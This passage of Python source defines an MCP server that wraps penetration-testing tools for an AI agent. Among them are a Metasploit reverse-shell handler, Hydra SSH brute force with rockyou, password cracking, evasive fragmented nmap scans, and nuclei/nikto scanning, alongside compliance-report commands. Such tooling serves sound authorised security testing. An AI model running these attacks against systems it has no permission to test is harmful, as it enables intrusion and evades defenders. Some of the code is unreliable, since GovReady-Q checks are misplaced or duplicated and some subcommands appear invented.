                    filename = f"nessus_scan_{scan_id}.{export_format}"
                    filepath = os.path.join(temp_dir, filename)
                    
                    with open(filepath, 'wb') as f:
                        f.write(download_response.content)
                    
                    result = {
                        'scan_id': scan_id,
                        'status': 'completed',
                        'export_format': export_format,
                        'file_path': filepath,
                        'file_size': len(download_response.content),
                        'vulnerabilities': scan_data.get('vulnerabilities', {}),
                        'hosts': scan_data.get('hosts', [])
                    }
                    
                    return {
                        'stdout': json.dumps(result),
                        'stderr': '',
                        'returncode': 0
                    }
            except:
                pass
            
            time.sleep(10)
        
        return {
            'stdout': '',
            'stderr': 'Export timeout - scan results may be too large',
            'returncode': 1
        }
        
    except Exception as e:
        return {
            'stdout': '',
            'stderr': f'Nessus results error: {str(e)}',
            'returncode': 1
        }

@mcp.tool()
async def upload_to_defectdojo(file_path: str, engagement_id: int, 
                              defectdojo_url: str, api_token: str,
                              scan_type: str, product_name: str = None,
                              test_title: str = None, auto_create_context: bool = True,
                              close_old_findings: bool = False, push_to_jira: bool = False):
    """
    Upload scan results to DefectDojo for vulnerability management
    
    Args:
        file_path: Path to scan results file
        engagement_id: DefectDojo engagement ID
        defectdojo_url: DefectDojo instance URL
        api_token: DefectDojo API token
        scan_type: Type of scan results (Nuclei/Nmap/OWASP ZAP/etc)
        product_name: Product name in DefectDojo
        test_title: Title for the test
        auto_create_context: Auto-create context for findings
        close_old_findings: Close old findings
        push_to_jira: Push findings to JIRA
    """
    try:
        import json
        
        headers = {
            "Authorization": f"Token {api_token}",
            "Content-Type": "application/json"
        }
        
        # Read scan results
        with open(file_path, 'r') as f:
            scan_data = f.read()
            
        upload_data = {
            "engagement": engagement_id,
            "scan_type": scan_type,
            "file": scan_data,
            "auto_create_context": auto_create_context,
            "close_old_findings": close_old_findings,
            "push_to_jira": push_to_jira
        }
        
        if test_title:
            upload_data["test_title"] = test_title
        if product_name:
            upload_data["product_name"] = product_name
            
        response = requests.post(
            f"{defectdojo_url}/api/v2/import-scan/",
            headers=headers,
            json=upload_data,
            timeout=60
        )
        
        return {
            'stdout': json.dumps(response.json()) if response.status_code == 201 else '',
            'stderr': f'Upload failed: {response.text}' if response.status_code != 201 else '',
            'returncode': 0 if response.status_code == 201 else 1
        }
        
    except Exception as e:
        return {
            'stdout': '',
            'stderr': f'DefectDojo upload error: {str(e)}',
            'returncode': 1
        }

@mcp.tool()
async def create_dradis_project(project_name: str, dradis_url: str, api_token: str,
                               description: str = None, client_name: str = None):
    """
    Create and manage projects in Dradis for reporting
    
    Args:
        project_name: Name of the project to create
        dradis_url: Dradis instance URL  
        api_token: Dradis API token
        description: Project description
        client_name: Client name for the project
    """
    try:
        import json
        
        headers = {
            "Authorization": f"Token token={api_token}",
            "Content-Type": "application/json"
        }
        
        project_data = {
            "project": {
                "name": project_name,
                "description": description or f"Security assessment for {project_name}",
                "client": client_name or "External Assessment"
            }
        }
        
        response = requests.post(
            f"{dradis_url}/pro/api/projects",
            headers=headers,
            json=project_data,
            timeout=30
        )
        
        return {
            'stdout': json.dumps(response.json()) if response.status_code == 201 else '',
            'stderr': f'Project creation failed: {response.text}' if response.status_code != 201 else '',
            'returncode': 0 if response.status_code == 201 else 1
        }
        
    except Exception as e:
        return {
            'stdout': '',
            'stderr': f'Dradis project creation error: {str(e)}',
            'returncode': 1
        }

@mcp.tool()
async def diagnose_subfinder(target: str):
    """
    Diagnose subfinder performance and configuration issues
    
    Args:
        target: Domain to test subfinder against
    """
    results = {}
    
    # Test subfinder version
    version_cmd = ["subfinder", "-version"]
    version_result = run_command(version_cmd)
    results['version'] = version_result
    
    # Test simple subfinder command
    simple_cmd = ["subfinder", "-domain", target, "-silent", "-t", "10", "-timeout", "10"]
    simple_result = run_command(simple_cmd)
    results['simple_test'] = simple_result
    
    # Test DNS resolution
    dns_cmd = ["nslookup", target]
    dns_result = run_command(dns_cmd)
    results['dns_test'] = dns_result
    
    # Test with single source only
    fast_cmd = ["subfinder", "-domain", target, "-silent", "-sources", "crtsh", "-t", "5"]
    fast_result = run_command(fast_cmd)
    results['single_source_test'] = fast_result
    
    import json
    return {
        'stdout': json.dumps(results, indent=2),
        'stderr': '',
        'returncode': 0
    }

@mcp.tool()
async def scan_with_w3af(target: str, profile: str = "OWASP_TOP10", threads: int = 4):
    """
    Web application security scanning using W3af framework
    
    Args:
        target: Target URL to scan
        profile: W3af profile to use (OWASP_TOP10/full_audit/bruteforce/etc)
        threads: Number of concurrent threads
    """
    # Check if GovReady-Q is available
    check_result = check_govready_q_mcp()
    if check_result:
        return [mcp.TextContent(type="text", text=check_result['output'])]
    
    command = [
        "w3af_console",
        "-s", f"/tmp/w3af_script_{profile}.w3af"
    ]
    
    # Create W3af script
    script_content = f"""
plugins
output console,textFile
output config textFile
set fileName /tmp/w3af_output.txt
set verbose True
back
output config console
set verbose True
back

audit {profile}
grep all
crawl webSpider
crawl config webSpider
set onlyForward True
back

target
set target {target}
back

start
exit
"""
    
    import tempfile
    script_path = f"/tmp/w3af_script_{profile}.w3af"
    with open(script_path, "w") as f:
        f.write(script_content)
    
    return run_command(command)

@mcp.tool()
async def scan_with_burp(target: str, project_file: str = "/tmp/burp_project", 
                        scan_type: str = "crawl_and_audit"):
    """
    Web application security scanning using Burp Suite Professional
    
    Args:
        target: Target URL to scan
        project_file: Burp project file path
        scan_type: Type of scan (crawl_and_audit/crawl_only/audit_only)
    """
    # Check if GovReady-Q is available
    check_result = check_govready_q_mcp()
    if check_result:
        return [mcp.TextContent(type="text", text=check_result['output'])]
    
    command = [
        "java", "-jar", "/opt/burpsuite_pro/burpsuite_pro.jar",
        "--project-file", project_file,
        "--config-file", "/tmp/burp_config.json"
    ]
    
    # Create Burp config
    config = {
        "target": {
            "scope": {
                "include": [{"rule": target}]
            }
        },
        "spider": {
            "mode": "modern"
        },
        "scanner": {
            "audit_items": "all"
        }
    }
    
    import json
    with open("/tmp/burp_config.json", "w") as f:
        json.dump(config, f)
    
    return run_command(command)

@mcp.tool()
async def exploit_with_metasploit(target: str, payload: str = "generic/shell_reverse_tcp",
                                 lhost: str = "127.0.0.1", lport: int = 4444):
    """
    Exploitation using Metasploit framework
    
    Args:
        target: Target IP/hostname
        payload: Metasploit payload to use
        lhost: Local host for reverse connection
        lport: Local port for reverse connection
    """
    commands = [
        f"use exploit/multi/handler",
        f"set payload {payload}",
        f"set LHOST {lhost}",
        f"set LPORT {lport}",
        f"set RHOSTS {target}",
        "exploit"
    ]
    
    # Check if GovReady-Q is available
    check_result = check_govready_q_mcp()
    if check_result:
        return [mcp.TextContent(type="text", text=check_result['output'])]
    
    command = [
        "msfconsole", "-q", "-x",
        "; ".join(commands)
    ]
    
    return run_command(command)

@mcp.tool()
async def bruteforce_with_hydra(target: str, service: str = "ssh", 
                               username: str = None, wordlist: str = None,
                               threads: int = 4, port: int = None):
    """
    Password bruteforce attacks using Hydra
    
    Args:
        target: Target IP/hostname
        service: Service to attack (ssh/ftp/http/etc)
        username: Username to attack (or username list file)
        wordlist: Password wordlist file
        threads: Number of parallel connections
        port: Target port (optional)
    """
    if not wordlist:
        wordlist = "/usr/share/wordlists/rockyou.txt"
    
    # Check if GovReady-Q is available
    check_result = check_govready_q_mcp()
    if check_result:
        return [mcp.TextContent(type="text", text=check_result['output'])]
    
    command = [
        "hydra",
        "-t", str(threads),
        "-V"
    ]
    
    if username:
        if "@" in username:  # Email list format
            command.extend(["-L", username])
        else:
            command.extend(["-l", username])
    
    if wordlist:
        command.extend(["-P", wordlist])
    
    if port:
        command.extend(["-s", str(port)])
    
    command.extend([target, service])
    
    return run_command(command)

@mcp.tool()
async def crack_passwords_john(hash_file: str, wordlist: str = None, 
                              format_type: str = None, threads: int = 4):
    """
    Password cracking using John the Ripper
    
    Args:
        hash_file: File containing password hashes
        wordlist: Wordlist file for dictionary attack
        format_type: Hash format (md5/sha1/sha256/etc)
        threads: Number of threads to use
    """
    # Check if GovReady-Q is available
    check_result = check_govready_q_mcp()
    if check_result:
        return [mcp.TextContent(type="text", text=check_result['output'])]
    
    command = [
        "john",
        "--fork=" + str(threads)
    ]
    
    if wordlist:
        command.extend(["--wordlist=" + wordlist])
    
    if format_type:
        command.extend(["--format=" + format_type])
    
    command.append(hash_file)
    
    return run_command(command)

@mcp.tool()
async def scan_with_skipfish(target: str, output_dir: str = "/tmp/skipfish_output",
                           threads: int = 4, depth: int = 5):
    """
    Web application security scanning using Skipfish
    
    Args:
        target: Target URL to scan
        output_dir: Output directory for results
        threads: Number of concurrent connections
        depth: Maximum crawling depth
    """
    # Check if GovReady-Q is available
    check_result = check_govready_q_mcp()
    if check_result:
        return [mcp.TextContent(type="text", text=check_result['output'])]
    
    command = [
        "skipfish",
        "-o", output_dir,
        "-m", str(depth),
        "-W", "/usr/share/skipfish/dictionaries/minimal.wl",
        "-t", str(threads),
        target
    ]
    
    return run_command(command)

@mcp.tool()
async def scan_with_ratproxy(target: str, port: int = 8080, 
                           output_file: str = "/tmp/ratproxy.log"):
    """
    Web application security audit using Ratproxy
    
    Args:
        target: Target URL to proxy
        port: Proxy port to listen on
        output_file: Output log file
    """
    # Check if GovReady-Q is available
    check_result = check_govready_q_mcp()
    if check_result:
        return [mcp.TextContent(type="text", text=check_result['output'])]
    
    command = [
        "ratproxy",
        "-w", output_file,
        "-v", target,
        "-p", str(port),
        "-lextifscxmjr"
    ]
    
    return run_command(command)

@mcp.tool()
async def fuzz_with_wfuzz(target: str, wordlist: str = None, threads: int = 4,
                         hide_codes: str = "404", fuzz_param: str = "FUZZ"):
    """
    Web application fuzzing using Wfuzz
    
    Args:
        target: Target URL with FUZZ keyword
        wordlist: Wordlist file for fuzzing
        threads: Number of concurrent connections
        hide_codes: HTTP status codes to hide
        fuzz_param: Fuzzing parameter name
    """
    if not wordlist:
        wordlist = "/usr/share/wordlists/dirb/common.txt"
    
    # Check if GovReady-Q is available
    check_result = check_govready_q_mcp()
    if check_result:
        return [mcp.TextContent(type="text", text=check_result['output'])]
    
    command = [
        "wfuzz",
        "-c",
        "-z", f"file,{wordlist}",
        "--hc", hide_codes,
        "-t", str(threads),
        target.replace("FUZZ", fuzz_param)
    ]
    
    return run_command(command)

@mcp.tool()
async def scan_with_watcher(target: str, output_file: str = "/tmp/watcher.log"):
    """
    Web application security scanning using Watcher
    
    Args:
        target: Target URL to scan
        output_file: Output file for results
    """
    # Check if GovReady-Q is available
    check_result = check_govready_q_mcp()
    if check_result:
        return [mcp.TextContent(type="text", text=check_result['output'])]
    
    command = [
        "watcher",
        "-u", target,
        "-o", output_file,
        "--spider"
    ]
    
    return run_command(command)

@mcp.tool()
async def scan_with_nikto(target: str, port: int = 80, ssl: bool = False,
                         output_file: str = "/tmp/nikto.txt"):
    """
    Web server security scanning using Nikto
    
    Args:
        target: Target hostname/IP
        port: Target port
        ssl: Use SSL/HTTPS
        output_file: Output file for results
    """
    # Check if GovReady-Q is available
    check_result = check_govready_q_mcp()
    if check_result:
        return [mcp.TextContent(type="text", text=check_result['output'])]
    
    command = [
        "nikto",
        "-h", target,
        "-p", str(port),
        "-o", output_file,
        "-Format", "txt"
    ]
    
    if ssl:
        command.append("-ssl")
    
    return run_command(command)

@mcp.tool()
async def scan_with_nmap(target: str, scan_type: str = "sS", ports: str = "1-65535",
                        threads: int = 4, scripts: str = None, output_file: str = "/tmp/nmap.xml"):
    """
    Network scanning using Nmap
    
    Args:
        target: Target IP/hostname/CIDR
        scan_type: Nmap scan type (sS/sT/sU/sA/etc)
        ports: Port range to scan
        threads: Number of parallel scans
        scripts: NSE scripts to run
        output_file: Output file for results
    """
    # Check if GovReady-Q is available
    check_result = check_govready_q_mcp()
    if check_result:
        return [mcp.TextContent(type="text", text=check_result['output'])]
    
    command = [
        "nmap",
        f"-{scan_type}",
        "-p", ports,
        "-T4",
        "--max-parallelism", str(threads),
        "-oX", output_file
    ]
    
    if scripts:
        command.extend(["--script", scripts])
    
    command.append(target)
    
    return run_command(command)

@mcp.tool()
async def scan_stealth_subdomains(target: str, sources: str = "passive", delay: int = 3):
    """
    Stealth subdomain scanning optimized for protected targets
    
    Args:
        target: Domain to scan
        sources: Source type (passive/active/mixed)
        delay: Delay between requests in seconds
    """
    if sources == "passive":
        # Only passive sources that don't contact target
        source_list = "crtsh,bufferover,rapiddns,virustotal,securitytrails"
    elif sources == "active":
        source_list = "dnsdumpster,hackertarget"
    else:
        source_list = "crtsh,bufferover,rapiddns"
    
    # Check if GovReady-Q is available
    check_result = check_govready_q_mcp()
    if check_result:
        return [mcp.TextContent(type="text", text=check_result['output'])]
    
    command = [
        "subfinder",
        "-domain", target,
        "-silent",
        "-t", "2",  # Low thread count
        "-timeout", "30",
        "-sources", source_list,
        "-rate-limit", "5",  # Very conservative rate limit
        "-random-agent"
    ]
    
    return run_command(command)

@mcp.tool()
async def scan_stealth_ports(target: str, ports: str = "80,443,8080,8443", timing: str = "slow"):
    """
    Stealth port scanning to avoid detection
    
    Args:
        target: Target IP or domain
        ports: Ports to scan
        timing: Scan timing (slow/normal/fast)
    """
    timing_map = {
        "slow": "-T1",      # Paranoid (very slow)
        "normal": "-T2",    # Polite  
        "fast": "-T3"       # Normal
    }
    
    # Check if GovReady-Q is available
    check_result = check_govready_q_mcp()
    if check_result:
        return [mcp.TextContent(type="text", text=check_result['output'])]
    
    command = [
        "nmap",
        "-sS",  # SYN scan
        timing_map.get(timing, "-T2"),
        "-p", ports,
        "--max-parallelism", "1",
        "--scan-delay", "3s",
        "--max-retries", "1",
        "-Pn",  # Skip ping
        "-f",   # Fragment packets
        "--randomize-hosts",
        "-oN", "/tmp/stealth_scan.txt",
        target
    ]
    
    return run_command(command)

@mcp.tool()
async def passive_reconnaissance(target: str, api_sources: bool = False):
    """
    Passive reconnaissance without directly contacting target
    
    Args:
        target: Domain to research
        api_sources: Whether to use API-based sources
    """
    import json
    results = {}
    
    # Certificate Transparency
    ct_cmd = ["curl", "-s", f"https://crt.sh/?q=%25.{target}&output=json"]
    ct_result = run_command(ct_cmd)
    results['certificate_transparency'] = ct_result
    
    # DNS History (passive)
    dns_cmd = ["curl", "-s", f"https://securitytrails.com/domain/{target}/dns"]
    dns_result = run_command(dns_cmd)
    results['dns_history'] = dns_result
    
    return {
        'stdout': json.dumps(results, indent=2),
        'stderr': '',
        'returncode': 0
    }

@mcp.tool()
async def nuclei_stealth_scan(target: str, severity: str = "info,low", templates: str = "passive"):
    """
    Non-aggressive Nuclei scanning for protected targets
    
    Args:
        target: Target URL
        severity: Severity levels to scan
        templates: Template category (passive/safe/all)
    """
    template_map = {
        "passive": "http/misconfiguration/,http/technologies/,ssl/",
        "safe": "http/misconfiguration/,http/technologies/,ssl/,dns/",
        "all": ""  # All templates
    }
    
    # Check if GovReady-Q is available
    check_result = check_govready_q_mcp()
    if check_result:
        return [mcp.TextContent(type="text", text=check_result['output'])]
    
    command = [
        "nuclei",
        "-u", target,
        "-silent", "-nc", "-j",
        "-rate-limit", "3",  # Very slow rate
        "-timeout", "15",
        "-retries", "1",
        "-severity", severity
    ]
    
    if templates != "all":
        command.extend(["-t", template_map[templates]])
    
    return run_command(command)

def check_govready_q_mcp():
    """Check if GovReady-Q is installed for MCP functions"""
    import os
    if not os.path.exists("/opt/govready-q/manage.py"):
        return {
            'output': 'GovReady-Q not installed. Install with: pip install govready-q or see https://govready-q.readthedocs.io/',
            'error': True
        }
    return None

@mcp.tool()
async def start_compliance_assessment(framework: str = "nist_800_53", 
                                     project_name: str = "Security Assessment",
                                     organization: str = "Default Org"):
    """
    Start a new compliance assessment using GovReady-Q
    
    Args:
        framework: Compliance framework (nist_800_53/fedramp/iso27001/soc2)
        project_name: Name of the compliance project
        organization: Organization name for the assessment
    """
    # Check if GovReady-Q is available
    check_result = check_govready_q_mcp()
    if check_result:
        return [mcp.TextContent(type="text", text=check_result['output'])]
    
    # Check if GovReady-Q is available
    check_result = check_govready_q_mcp()
    if check_result:
        return [mcp.TextContent(type="text", text=check_result['output'])]
    
    command = [
        "python3", "/opt/govready-q/manage.py",
        "start_assessment",
        "--framework", framework,
        "--project", project_name,
        "--org", organization,
        "--output-format", "json"
    ]
    
    return run_command(command)

@mcp.tool()
async def run_compliance_scan(target: str, framework: str = "nist_800_53",
                             scan_type: str = "infrastructure", 
                             evidence_collection: bool = True):
    """
    Run automated compliance scanning against target infrastructure
    
    Args:
        target: Target system/URL to assess for compliance
        framework: Compliance framework to assess against
        scan_type: Type of scan (infrastructure/application/network/cloud)
        evidence_collection: Whether to collect compliance evidence
    """
    # Check if GovReady-Q is available
    check_result = check_govready_q_mcp()
    if check_result:
        return [mcp.TextContent(type="text", text=check_result['output'])]
    
    # Check if GovReady-Q is available
    check_result = check_govready_q_mcp()
    if check_result:
        return [mcp.TextContent(type="text", text=check_result['output'])]
    
    command = [
        "python3", "/opt/govready-q/manage.py",
        "compliance_scan",
        "--target", target,
        "--framework", framework,
        "--scan-type", scan_type,
        "--collect-evidence" if evidence_collection else "--no-evidence",
        "--output", "/tmp/compliance_results.json"
    ]
    
    return run_command(command)

@mcp.tool()
async def generate_compliance_report(project_id: str = None,
                                   report_format: str = "oscal", 
                                   include_evidence: bool = True,
                                   control_families: str = None):
    """
    Generate compliance assessment reports in various formats
    
    Args:
        project_id: GovReady-Q project identifier
        report_format: Report format (oscal/docx/pdf/json)
        include_evidence: Include compliance evidence in report
        control_families: Specific control families to include (AC,AU,SC,etc)
    """
    # Check if GovReady-Q is available
    check_result = check_govready_q_mcp()
    if check_result:
        return [mcp.TextContent(type="text", text=check_result['output'])]
    
    # Check if GovReady-Q is available
    check_result = check_govready_q_mcp()
    if check_result:
        return [mcp.TextContent(type="text", text=check_result['output'])]
    
    command = [
        "python3", "/opt/govready-q/manage.py",
        "export_report"
    ]
    
    if project_id:
        command.extend(["--project-id", project_id])
    
    command.extend([
        "--format", report_format,
        "--output", f"/tmp/compliance_report.{report_format}"
    ])
    
    if include_evidence:
        command.append("--include-evidence")
    
    if control_families:
        command.extend(["--controls", control_families])
    
    return run_command(command)

@mcp.tool()
async def assess_security_controls(target: str, control_baseline: str = "moderate",
                                 control_set: str = "nist_800_53", 
                                 assessment_mode: str = "automated"):
    """
    Assess security controls implementation against compliance frameworks
    
    Args:
        target: Target system to assess
        control_baseline: Security control baseline (low/moderate/high)
        control_set: Control set to assess (nist_800_53/iso27001/cis)
        assessment_mode: Assessment mode (automated/manual/hybrid)
    """
    # Check if GovReady-Q is available
    check_result = check_govready_q_mcp()
    if check_result:
        return [mcp.TextContent(type="text", text=check_result['output'])]
    
    # Check if GovReady-Q is available
    check_result = check_govready_q_mcp()
    if check_result:
        return [mcp.TextContent(type="text", text=check_result['output'])]
    
    command = [
        "python3", "/opt/govready-q/manage.py",
        "assess_controls",
        "--target", target,
        "--baseline", control_baseline,
        "--control-set", control_set,
        "--mode", assessment_mode,
        "--output", "/tmp/control_assessment.json"
    ]
    
    return run_command(command)

@mcp.tool()
async def validate_oscal_catalog(catalog_file: str, validate_links: bool = True,
                               check_completeness: bool = True):
    """
    Validate OSCAL (Open Security Controls Assessment Language) catalogs
    
    Args:
        catalog_file: Path to OSCAL catalog JSON/XML file
        validate_links: Validate all links and references
        check_completeness: Check catalog completeness
    """
    # Check if GovReady-Q is available
    check_result = check_govready_q_mcp()
    if check_result:
        return [mcp.TextContent(type="text", text=check_result['output'])]
    
    # Check if GovReady-Q is available
    check_result = check_govready_q_mcp()
    if check_result:
        return [mcp.TextContent(type="text", text=check_result['output'])]
    
    command = [
        "python3", "/opt/govready-q/manage.py",
        "validate_oscal",
        "--catalog", catalog_file
    ]
    
    if validate_links:
        command.append("--validate-links")
    
    if check_completeness:
        command.append("--check-complete")
    
    command.extend(["--output", "/tmp/oscal_validation.json"])
    
    return run_command(command)

@mcp.tool()
async def generate_system_security_plan(system_name: str, system_type: str = "web_application",
                                      authorization_boundary: str = "system",
                                      impact_level: str = "moderate"):
    """
    Generate System Security Plan (SSP) documentation
    
    Args:
        system_name: Name of the system being documented
        system_type: Type of system (web_application/database/network/cloud)
        authorization_boundary: Authorization boundary scope
        impact_level: FIPS 199 impact level (low/moderate/high)
    """
    # Check if GovReady-Q is available
    check_result = check_govready_q_mcp()
    if check_result:
        return [mcp.TextContent(type="text", text=check_result['output'])]
    
    # Check if GovReady-Q is available
    check_result = check_govready_q_mcp()
    if check_result:
        return [mcp.TextContent(type="text", text=check_result['output'])]
    
    command = [
        "python3", "/opt/govready-q/manage.py",
        "generate_ssp",
        "--system-name", system_name,
        "--system-type", system_type,
        "--boundary", authorization_boundary,
        "--impact-level", impact_level,
        "--output", f"/tmp/ssp_{system_name.replace(' ', '_')}.docx"
    ]
    
    return run_command(command)

@mcp.tool()
async def compliance_gap_analysis(current_state: str, target_framework: str = "nist_800_53",
                                target_baseline: str = "moderate", 
                                output_recommendations: bool = True):
    """
    Perform compliance gap analysis between current and target state
    
    Args:
        current_state: Path to current compliance state file (JSON/OSCAL)
        target_framework: Target compliance framework
        target_baseline: Target security baseline
        output_recommendations: Generate remediation recommendations
    """
    # Check if GovReady-Q is available
    check_result = check_govready_q_mcp()
    if check_result:
        return [mcp.TextContent(type="text", text=check_result['output'])]
    
    command = [
        "python3", "/opt/govready-q/manage.py",
        "gap_analysis",
        "--current", current_state,
        "--target-framework", target_framework,
        "--target-baseline", target_baseline
    ]
    
    if output_recommendations:
        command.append("--recommendations")
    
    command.extend(["--output", "/tmp/gap_analysis.json"])
    
    return run_command(command)

@mcp.tool()
async def run_internal_compliance_scan(target_network: str, framework: str = "nist_800_53",
                                     baseline: str = "moderate", include_systems: bool = True,
                                     include_databases: bool = True, credentialed_scan: bool = False):
    """
    High-confidence internal NIST compliance assessment with full scope
    
    Args:
        target_network: Internal network CIDR (e.g., 10.0.0.0/24)
        framework: Compliance framework (nist_800_53/fedramp/iso27001)
        baseline: Security baseline (low/moderate/high)
        include_systems: Include system configuration assessment
        include_databases: Include database security assessment
        credentialed_scan: Use system credentials for detailed assessment
    """
    # Check if GovReady-Q is available
    check_result = check_govready_q_mcp()
    if check_result:
        return [mcp.TextContent(type="text", text=check_result['output'])]
    
    command = [
        "python3", "/opt/govready-q/manage.py",
        "compliance_scan",
        "--target", target_network,
        "--framework", framework,
        "--baseline", baseline,
        "--scan-type", "internal",
        "--collect-evidence",
        "--confidence-target", "high",
        "--assessment-scope", "full"
    ]
    
    if include_systems:
        command.append("--include-systems")
    
    if include_databases:
        command.append("--include-databases")
    
    if credentialed_scan:
        command.append("--credentialed")
    
    command.extend(["--output", "/tmp/internal_compliance_results.json"])
    
    return run_command(command)

@mcp.tool()
async def assess_internal_network_controls(target_network: str, control_families: str = "AC,AU,SC,SI",
                                         assessment_depth: str = "comprehensive"):
    """
    Assess specific NIST control families on internal network infrastructure
    
    Args:
        target_network: Internal network CIDR to assess
        control_families: NIST control families (AC,AU,SC,SI,CM,IA,etc)
        assessment_depth: Assessment depth (basic/standard/comprehensive)
    """
    # Enhanced scanning for specific control families
    families = control_families.split(',')
    assessment_commands = []
    
    for family in families:
        family = family.strip().upper()
        
        if family == "AC":  # Access Control
            assessment_commands.extend([
                f"nmap --script smb-enum-users,smb-enum-shares {target_network}",
                f"nmap --script ssh-auth-methods,ssh-brute {target_network}",
                f"nuclei -target {target_network} -t /opt/nuclei-templates/default-logins/ -silent"
            ])
        
        elif family == "AU":  # Audit and Accountability  
            assessment_commands.extend([
                f"nmap --script ms-sql-info,mysql-info {target_network}",
                f"nuclei -target {target_network} -t /opt/nuclei-templates/exposures/ -silent"
            ])
        
        elif family == "SC":  # System and Communications Protection
            assessment_commands.extend([
                f"nmap --script ssl-enum-ciphers,ssl-cert {target_network}",
                f"nuclei -target {target_network} -t /opt/nuclei-templates/ssl/ -silent",
                f"tlsx -list {target_network} -cipher -tls-version -json"
            ])
        
        elif family == "SI":  # System and Information Integrity
            assessment_commands.extend([
                f"nuclei -target {target_network} -t /opt/nuclei-templates/cves/ -severity medium,high,critical -silent",
                f"nuclei -target {target_network} -t /opt/nuclei-templates/vulnerabilities/ -silent"
            ])
    
    # Execute comprehensive assessment
    # Check if GovReady-Q is available
    check_result = check_govready_q_mcp()
    if check_result:
        return [mcp.TextContent(type="text", text=check_result['output'])]
    
    command = [
        "python3", "/opt/govready-q/manage.py",
        "assess_controls",
        "--target", target_network,
        "--control-families", control_families,
        "--assessment-mode", "automated",
        "--depth", assessment_depth,
        "--output", f"/tmp/control_assessment_{control_families.replace(',', '_')}.json"
    ]
    
    return run_command(command)

@mcp.tool()
async def system_configuration_compliance_audit(target_systems: str, os_type: str = "mixed",
                                               audit_policies: str = "security,access,logging"):
    """
    Detailed system configuration compliance audit for NIST controls
    
    Args:
        target_systems: Comma-separated list of system IPs/hostnames
        os_type: Operating system type (windows/linux/mixed)
        audit_policies: Security policies to validate
    """
    # Check if GovReady-Q is available
    check_result = check_govready_q_mcp()
    if check_result:
        return [mcp.TextContent(type="text", text=check_result['output'])]
    
    command = [
        "python3", "/opt/govready-q/manage.py",
        "system_audit",
        "--targets", target_systems,
        "--os-type", os_type,
        "--policies", audit_policies,
        "--compliance-framework", "nist_800_53",
        "--output", "/tmp/system_config_audit.json"
    ]
    
    # Add OS-specific configuration checks
    if os_type == "windows" or os_type == "mixed":
        command.extend(["--windows-checks", "gpo,registry,services,users"])
    
    if os_type == "linux" or os_type == "mixed":
        command.extend(["--linux-checks", "configs,permissions,processes,users"])
    
    return run_command(command)

@mcp.tool()
async def generate_high_confidence_compliance_report(assessment_data: str, 
                                                   framework: str = "nist_800_53",
                                                   confidence_level: str = "high"):
    """
    Generate high-confidence compliance report with internal assessment data
    
    Args:
        assessment_data: Path to assessment data file
        framework: Compliance framework
        confidence_level: Confidence level (medium/high/very_high)
    """
    # Check if GovReady-Q is available
    check_result = check_govready_q_mcp()
    if check_result:
        return [mcp.TextContent(type="text", text=check_result['output'])]
    
    command = [
        "python3", "/opt/govready-q/manage.py",
        "generate_compliance_report",
        "--input", assessment_data,
        "--framework", framework,
        "--confidence-level", confidence_level,
        "--assessment-scope", "internal+external",
        "--include-evidence",
        "--include-recommendations",
        "--format", "oscal",
        "--output", f"/tmp/high_confidence_nist_report.oscal"
    ]
    
    return run_command(command)


if __name__ == "__main__":
    import os
    # Check if running in cloud environment
    if os.environ.get('PORT'):
        # Run as HTTP server for cloud deployment
        mcp.run(transport="sse", host="0.0.0.0", port=8000)
    else:
        # Run as STDIO for local development
        mcp.run(transport="stdio")